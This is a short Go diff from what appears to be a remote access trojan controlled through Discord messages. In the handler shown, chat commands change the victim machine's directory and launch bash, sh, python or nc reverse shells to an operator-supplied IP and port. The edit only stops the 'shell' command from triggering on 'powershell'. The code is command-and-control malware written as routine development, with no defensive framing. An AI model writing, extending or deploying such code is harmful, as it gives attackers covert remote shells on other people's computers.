@@ -282,7 +282,7 @@ func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) 
 				commandBreakdown := strings.Fields(message.Content)
 				os.Chdir(commandBreakdown[1])
 				dg.ChannelMessageSend(message.ChannelID, "```Directory changed to "+commandBreakdown[1]+"```")
-			} else if strings.Contains(message.Content, "shell") {
+			} else if strings.Contains(message.Content, "shell") && !strings.Contains(message.Content, "powershell") {
 				splitCommand := strings.Fields(message.Content)
 				if len(splitCommand) == 1 {
 					dg.ChannelMessageSend(message.ChannelID, "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell python 127.0.0.1 69696\n Shell type: bash, sh, python and nc```")
